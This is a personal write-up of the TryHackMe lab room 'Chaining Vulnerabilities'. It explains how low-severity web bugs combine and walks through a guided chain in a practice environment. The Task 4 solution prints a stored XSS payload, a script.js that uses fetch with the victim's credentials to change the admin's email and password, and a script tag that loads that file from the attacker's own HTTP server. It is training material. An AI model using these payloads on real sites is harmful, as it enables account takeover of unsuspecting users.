<h1 align="center">Chaining Vulnerabilities</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/c132b1ee-330d-4c79-9791-fdcad9cf5f88"><br>
2025, September 16<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>498</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Learn how to chain vulnerabilities! From Low to High</em>!<br>
Access it <a href="https://tryhackme.com/room/chainingvulnerabilitiesZp">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7eaea741-be1a-4f57-aa7c-1ead2622f41f"></p>


<br>
<h1 align="center">Task 1 . Introduction</h1>
<h3 align="center">Virtual environment set up</h3>
<p></p>All the details can be foubd at the top of the page.</p>

<h3 align="center">Introduction</h3>

<p>When we talk about vulnerability chaining, we're referring to the idea that a single bug on its own might not seem like a big deal, but when combined with others, it can become dangerous. This is how real-world attackers think: not every vulnerability needs to be critical, as long as it helps them move forward. In fact, attackers often rely on several "low-risk" or "medium-risk" issues to gradually work their way to a serious compromise.<br>

This brings us to something important that's often overlooked when reading pentest reports: risk ratings are assigned per vulnerability in isolation. Organisations usually focus on remediating the criticals and highs, while deferring or accepting mediums and lows. But this mindset can be misleading. A medium-risk vulnerability like verbose error messages or weak password policy might not get immediate attention, but when chained together with other issues like missing CSRF protection or XSS, it could lead to a much higher-impact exploit. Sometimes, chaining multiple medium-rated issues results in a more damaging outcome than a single high-risk finding would have caused on its own.<br>

This room will walk you through how attackers approach an application holistically, looking for anything they can use, combining findings, and building on their access step by step. You'll go beyond checking for individual bugs and start recognising how everything fits together from an attacker's point of view.</p>

<h3 align="center">Objectives</h3>
<p>By the end of this room, you'll be able to:<br>

- Think like an attacker: Learn how to treat even small findings as potential stepping stones.<br>
- Understand common chains: Some bugs naturally pair well together. You'll learn why.<br>
- Recognise weak boundaries: Identify where trust breaks down between different parts of a web application.<br>
- Follow a real chain: You'll go from first access to remote code execution by chaining multiple low-to-medium severity issues.</p>

<h3 align="center">Pre-requisites</h3>
<p>Before starting this room, you should already be familiar with the fundamentals of web application security, including vulnerabilities like:<br>

- <a href="https://tryhackme.com/room/axss">Cross-Site Scripting (XSS)</a><br>
- <a href="https://tryhackme.com/room/csrfV2">Cross-Site Request Forgery (CSRF)</a><br>
- <a href="https://tryhackme.com/module/authentication">Weak authentication and session management</a><br>

If you haven't already, we strongly recommend completing the  <a href="https://tryhackme.com/path/outline/webapppentesting">Weak authentication and session management</a> learning pathway first, as this room builds directly on concepts introduced there.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Click me to proceed to the next task.<br>
<code>No answer needed</code></p>

<br>
<h1 align="center">Task 2 . Chaining Vulnerabilties</h1>
<h3 align="center">What is Vulnerability Chaining?</h3>
<p>Vulnerability chaining is when two or more individual weaknesses are combined to cause greater damage than they could alone. Think of it like this: one vulnerability gets your foot in the door, another gives you access to sensitive functionality, and a third might let you execute code or exfiltrate data. None of them are particularly dangerous on their own, but together, they're powerful.<br>

Let's look at a better example. Imagine you find a Self-XSS vulnerability in a user profile editor, the kind where the payload only runs in your own browser. On its own, that's pretty limited; you can't use it to target anyone else. But now imagine that the application also lacks CSRF protection. You craft a CSRF payload that forces an authenticated victim (like an admin) to unknowingly save your Self-XSS payload into their own profile. Later, when the admin views or edits their profile, the XSS fires, and now you've got code execution in their browser. Neither the Self-XSS nor the missing CSRF were critical on their own, but chained together, they give you full access to someone else's session.<br>

This is the essence of chaining: connecting lower-severity vulnerabilities to achieve something much more impactful.</p>

<h3 align="center">Why This Matters in the Real World</h3>
<p>In real-world attacks, this approach is more common than most people expect. One of the best-known examples is the Capital One breach in 2019. The attacker didn't rely on a critical zero-day. Instead, they began with a Server-Side Request Forgery (SSRF) vulnerability. On its own, that bug only allowed them to make HTTP requests from the server. However, that was enough to access the AWS EC2 metadata service, retrieve IAM credentials, and use those credentials to download sensitive files from an S3 bucket. None of these issues were individually critical, but the way they were chained led to a massive data breach.<br>

Another common scenario: an attacker finds a page vulnerable to SQL Injection, but it's behind a login. They also notice that the login form gives away whether a username exists, and that there's no limit on login attempts. Using this, they discover a valid username, brute-force the weak password, and log in. Now authenticated, they exploit the SQLi to dump data or escalate privileges. Again, no single issue here is a guaranteed entry point, but together they build a clear path to compromise.</p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/d2968361-94ea-43d7-8de7-1b0f8d338b00"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6><br>

<h3 align="center">Why Patch-by-Patch Aren´t Enough</h3>
<p>It's common for development teams to fix vulnerabilities one at a time, treating them as isolated problems. They patch the SQLi, but leave the account enumeration alone. Or they fix a file upload issue, but leave the XSS that lets you abuse the upload feature. These fixes might close individual doors, but they don't address the bigger picture, the system is still vulnerable because the connections between these bugs were never considered.<br>

That's why security needs to be approached holistically. Vulnerability chaining isn't some edge case; it's how real attacks happen. Attackers aren't playing fair, and they aren't following your bug tracker. They're looking for whatever combination of flaws gets them to their goal, whether that's access, persistence, or data.</p>

<p><em>Answer the question below</em></p>

<p>2.1. Click me to proceed to the next task.<br>
<code>No answer needed</code></p>

<br>
<h1 align="center">Task 3 . Methodology</h1>
<h2 align="center">How to Think Like an Attacker</h2>
<p>A skilled attacker rarely finds a single vulnerability and immediately wins. Instead, they explore the application like a curious user, identify small cracks, and slowly build up a path to their objective. The real power of chaining vulnerabilities comes from <strong>understanding how they interact</strong>, not just spotting them in isolation.<br>

This section introduces a repeatable process to help you think like an attacker. You'll learn how to map out an application, identify potential weaknesses, and combine them to achieve a larger goal, just like an adversary would.<br>

<h3 align="center">Step 1: Use the Application Like a Normal User</h3>
<p>Before anything else, explore the application with no assumptions. Register an account, log in, click around, and understand what features are available. Don't go hunting for bugs yet. Just get a feel for the flow, the user roles, and where sensitive actions happen (e.g. account settings, admin features, uploads).</p>p>

<h3 align="center">Step 2: Enumerate and Find Weaknesses</h3>
<p>Now shift your focus to identifying weak spots. These might be classic vulnerabilities like SQLi, XSS, or IDOR, or subtler behaviours like inconsistent error messages, user ID patterns in URLs, or file uploads that allow weird extensions.<br>

At this point, list all potential findings, even if they seem low-risk.</p>

<h3 align="center">Step 3: Understand What Each Finding Enables</h3>
<p>Once you've got a handful of weaknesses, assess them in isolation. Ask yourself:<br>
"What can I do with this if I assume nothing else is broken?"<br>

- Does this XSS run in a useful context?<br>
- Can this verbose login help with username enumeration?<br>
- Will this file upload let me drop a script somewhere?<br>

You're trying to understand the standalone <strong>potential</strong> of each issue.</p>

<h3 align="center">Step 4: Think Like an Attacker, What's the Goal?</h3>
<p>Now ask: What would an attacker want to do with this application?<br>

-Steal sensitive data?<br>
-Access an admin panel?<br>
-Escalate to remote code ex<br>ecution?

Context matters. An XSS on a blog might be annoying, but on a banking dashboard? That's a very different threat.</p>

<h3 align="center">Step 5: Build a Path from Weaknesses to Objective</h3>
<p>This is where you connect the dots. Look at your list of vulnerabilities and imagine a logical path from an external user to the attacker's goal.<br>

Example: Verbose login → valid usernames → weak password policy → login → stored XSS → admin visits → XSS fires → admin cookie theft → privilege escalation.<br>

The key is mapping out the exploit path step by step.</p>

<h3 align="center">Step 6: Execute and Validate Each Step</h3>
<p>Walk the chain in order. Don't assume something will work; test it.<br>

- Can you brute-force a password?<br>
- Does your XSS trigger in the right context?<br>
- Will the stolen cookie actually let you access the admin dashboard?<br>

This also helps uncover blockers or dependencies. Maybe the XSS only works on certain pages, or the login brute-force fails because of rate limiting.</p>

<h3 align="center">Step 7: Report the Full Chain</h3>
<p></p>When reporting, don't isolate the bugs. Tell the full story.<br>

Start with "an unauthenticated attacker can do X", and walk through the chain clearly. Make it obvious that the risk comes not from one bug, but from how they interact.<br>

Also, be clear about the <strong>impact escalation</strong>:<br>
"While each individual issue might be low or medium risk, together they result in full compromise of the system."</p>

<p><em>Answer the question below</em></p>

<p>3.1. Click me to proceed to the next task.<br>
<code>No answer needed</code></p>

<br>
<h1 align="center">Task 4 . Guided Chain</h1>
<p>In this task, we're going to walk through a full attack chain, piece by piece. Each stage will show how what seems like a small weakness can open the door to something much bigger. This isn't about discovering a single critical bug. It's about recognising how multiple minor flaws, when combined, can lead to a complete compromise of the system.</p>

<h3 align="center">Step 1: Developer Test Credentials</h3>
<p>The first thing you do when approaching any login form is to try the easy stuff. In this case, the web application hosted at <code>http://xx.xxx.xx.xxx/</code> has a test account left behind by the developer: <code>testuser</code> with the password <code>***********</code>. This isn't uncommon, devs often leave test data in place during staging, and if it makes its way into production, it's an easy win for attackers.</p>p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/4edf91b9-3aa2-4e76-af31-8a9d713c6c89"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6><br>

<p>By logging in as this low-privileged user, you gain access to basic user features.</p>

<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/7fac175e-11c8-4295-ae00-2e67a75e89a6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6><br>

<h3 align="center">Step 2: Stored XSS in User Profile</h3>
<p>After logging in, you explore the edit profile page and notice that the "display name" field reflects input directly into the page without proper sanitisation. You try inserting a basic payload like <script>alert(1)</script>, and sure enough, it executes when the profile is viewed.</p>

<h3 align="center">Step 3: CSRF via XSS - Changing Admin Credentials</h3>



<h3 align="center">Step 4: Login as Admin</h3>



<h2 align="center">Why Each Step Worked</h2>
<p>At every stage, the attack succeeded because the application made assumptions that weren't enforced:<br>

- It assumed developer test accounts wouldn't be left active.<br>
- It assumed profile input wouldn't be dangerous.<br>
- It assumed authenticated requests from the browser must be legitimate.<br>
- It assumed authentication was all you needed to access sensitive functions.<br>

By chaining these together, you've taken what could have been minor issues in isolation and used them to achieve full compromise.</p>

<p><em>Answer the questions below</em></p>


<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/18d1d149-c82b-4ae0-a88c-43493fcc0c88"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/18d1d149-c82b-4ae0-a88c-43493fcc0c88"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/313a03d3-6f3d-44ab-9411-f7210f916a1e"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/3bf2acfc-a563-4cb3-a64e-4e8980175326"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/01042482-efab-4464-8f65-22ad1e4818a1"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/fb2dac7b-d6eb-4df3-b464-5751ff27dbca"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/86aeda57-6034-4a91-a111-3567c3016ddf"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/1ed11117-5240-4034-b644-9d4b6c7f0a6d"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/5c85c167-a472-45a4-ba9b-ecdcc5f3cf12"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/47c6bdda-c6e6-411f-af5b-7bcbce6a15c6"><br><br>
                   <img width="900px" src="https://github.com/user-attachments/assets/704702db-9662-48a8-a7a5-a50d68bab42e"><br></h6><br>

<p align="center"><em>script.js</em></p>

```bash
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=attacker@thm.local&password=password123'
});
```

<h6 align="center">Log in as attacker@thm.local<br><img width="900px" src="https://github.com/user-attachments/assets/32bf5369-1c85-4e94-8b85-0cb50430e5f8"><br></h6><br>

<p>
  
- <code>Edit Profile</code><br>
- <script src="http://xx.xxx.xx.xx:8000/script.js"></script></p>

```bash
:~/ChainingVulnerabilities# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


<h6 align="center"><code>Edit Profile</code><img width="900px" src="https://github.com/user-attachments/assets/a320d80a-389f-4e64-928c-177ae82ea008"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/a985d973-6ec7-424b-9ad7-9fdebfc9ee3e"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/7def0255-c770-48fd-a733-8f8a80b57590"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/e8bf2d4c-092b-493a-9dfa-a0ebeae18030"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/766009c9-2913-463d-a9cd-468cd865a1a6"><br></h6><br>


```bash
:~/ChainingVulnerabilities# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xx - - [16/Sep/2025 xx7:xx:xx] "GET /script.js HTTP/1.1" 200 -
```

<h6 align="center"><img width="900px" src="https://github.com/user-attachments/assets/2f8c724c-56cd-402b-801f-1def9ac4fda4"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/a983934f-4e18-497a-a526-d0db5db70e36"><br><br>
                                            <img width="900px" src="https://github.com/user-attachments/assets/a549a713-a87a-42a8-9e07-0397f254dbfe"><br></h6><br>

<p><em>Answer the question below</em></p>

<p>4.1. What is the flag in the admin panel?<br>
<code>THM{************************************}
</code></p>

<p>4.2. What vulnerability enabled the attacker to force a change in the admin user´s password?<br>
<code>Cross-Site Scripting</code></p>

<br>
<h1 align="center">Task 5 . Alternate Paths</h1>
<p>One of the most important things to understand about vulnerability chaining is that it rarely follows a neat, straight line. When you're working through a real-world application, you'll often find that your first planned chain hits a wall. Maybe the developer actually did fix part of the issue, or maybe the environment is slightly different from what you expected. This is where creativity and flexibility make the difference between getting stuck and finding another way forward.</p>

<h3 align="center">When the Chain Isn't Linear</h3>
<p>In the previous task, we walked through a chain that went something like this: log in with a default password → exploit XSS → trigger CSRF → change admin email and password → gain admin. It reads nicely, but reality often throws in complications.<br>

Suppose the application did have CSRF tokens in place and your attempt to change the admin's email silently failed. Does this make your XSS useless? Far from it. A creative attacker wouldn't give up; they'd think about what else that XSS could do. Could you steal the admin's session cookie? Could you trick them into making a GET request that leaks sensitive information through a different vector? Could you use it to fingerprint what browser or plugins the admin uses, or force their browser to carry out another action on your behalf?<br>

This is where the attacker mindset shines through. The question isn't "does this work as I planned?" but "what else can I do with the access I have?"<br>

Experienced attackers always think in terms of pivot points. When you plan out a chain, don't just focus on one path to success. Think about alternatives if part of your plan fails. If the CSRF trick doesn't work, can you use XSS in a different way? If SQLi isn't exploitable for auth bypass, could it still dump useful data that helps with password guessing?<br><br>

A good habit is to mentally map out, or even sketch, the different pivots and fallback options as you discover them. This helps you stay structured in your approach, even when the target doesn't behave how you expect.</p>

<h6 align="center"><img width="400px" src="https://github.com/user-attachments/assets/ec39b85a-f649-4857-91ae-9b4dddd33975"><br>This image and all the theoretical content of the present article is TryHackMe´s property.<br></h6><br>

<h3 align="center">Red Team vs Bug Bounty: Different Endgames</h3>
<p>It's also worth understanding that your goal can shape how you think about chaining. On a <strong>red team engagement</strong>, your job is to demonstrate impact holistically. You want to follow the chain as far as you can, ideally reaching your objective (such as domain admin or sensitive data access) without being detected. This means you might actually use your chain to pivot into internal systems, move laterally, or establish persistence.<br>

On a <strong>bug bounty</strong>, the goal is different. Your job is to clearly show the risk and potential impact so the company can fix it. Sometimes, that means stopping before full exploitation because the report itself is enough to prove the point. For example, showing that you could change the admin's email or that you could dump user data through SQLi is usually enough, you don't need to go further.</p>

<p>Understanding the difference between these two perspectives helps you decide how much of the chain you need to build out and what level of evidence is appropriate.<br>

Vulnerability chaining is less about technical skill and more about curiosity and adaptability. Applications aren't perfect, but they're also not perfectly broken in predictable ways.</p>

<div align="center"><h6>

|<strong>Aspect</strong>              |<strong>Red Team Engagement</strong>                                                  |<strong>Bug Bounty Program</strong>           |
|:------------------------------------|:-------------------------------------------------------------------------------------|:---------------------------------------------|
|Primary Goal                         |Demonstrate real-world impact, identify gaps in the organisation's security posture   |Communicate risk clearly to the vendor        |
|Chaining                             |Used to pivot, escalate, and achieve access                                           |Used to show how multiple bugs combine        |
|Execution  Style                     |Stealthy, often avoids detection                                                      |Transparent, designed to be reproducible      |
|End Objective                        |Achieve defined goal (e.g., data exfil, DA)                                           |Submit a valid, impactful report              |
|Level of Exploitation                |Full chain executed if possible                                                       |Partial exploitation is fine if risk is clear |
|PoC Quality                          |May use real tools or simulate ops activity                                           |Requires clean, minimal, and safe reproduction|

</h6></div><br>

<p><em>Answer the question below</em></p>

<p>5.1. Click me to proceed to the next task.<br>
<code>No answer needed</code></p>

<br>
<h1 align="center">Task 6 . Conclusion</h1>
<p>By now, you've seen first-hand how vulnerabilities that might seem low-risk on their own can combine to cause serious damage. The key lesson from this walkthrough isn't just that a default password, an XSS, or a missing CSRF token are problems, it's that, together, they can lead all the way from a low-privileged account to full system compromise. Chaining is what turns small cracks into a breach.<br>

One of the most important things to remember is that vulnerability chaining is about context, observation, and creativity. Each step in the chain worked because you spotted an opportunity and thought about what it could give you next. That's what real attackers do: they follow the path the system unintentionally lays out for them, looking for ways to pivot and escalate at every turn.<br>

It's easy to get caught up in hunting for individual bugs, but chaining is what shows the real risk. That's why in professional penetration tests and red team exercises, reports highlight how weaknesses combine, not just how they stand on their own. This mindset helps both attackers and defenders understand what needs to be fixed to truly reduce risk.<br>

The next step is to apply what you've learned in other challenge rooms within this module. Now that you've seen how the process works, have a go at identifying your own chains. Remember: don't just look for the critical bug, look for how small things fit together.</p>

<p><em>Answer the question below</em></p>

<p>6.1. I can now chain vulnerabilities!.<br>
<code>No answer needed</code></p>

<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/635ae830-b638-48aa-9231-a62f3ede1c3c"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/024eb6c5-60a7-438b-97d6-930afc5bb325"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>

<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
| 2025, Sep 16      |Medium 🔗 - <code><strong>Chaining Vulnerabilities</strong></code>| 498| 108ᵗʰ |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
| 2025, Sep 15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
| 2025, Sep 14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
| 2025, Sep 14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
| 2025, Sep 13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
| 2025, Sep 13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
| 2025, Sep 12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
| 2025, Sep 12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
| 2025, Sep 11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
| 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
| 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   108ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/81b8a18b-1cc8-470d-974f-ac6b986c2344"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c1d05c54-609a-4b2f-a5da-4ba25abeb002"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d3dff14e-651a-484f-ac68-c784095c7005"><br>
                  Global monthly:    352ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/10efb653-2d8c-4bf1-8ea4-8db1d62ed346"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/786ed5d0-15b9-4cf7-8374-c68f3bd9991d"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 


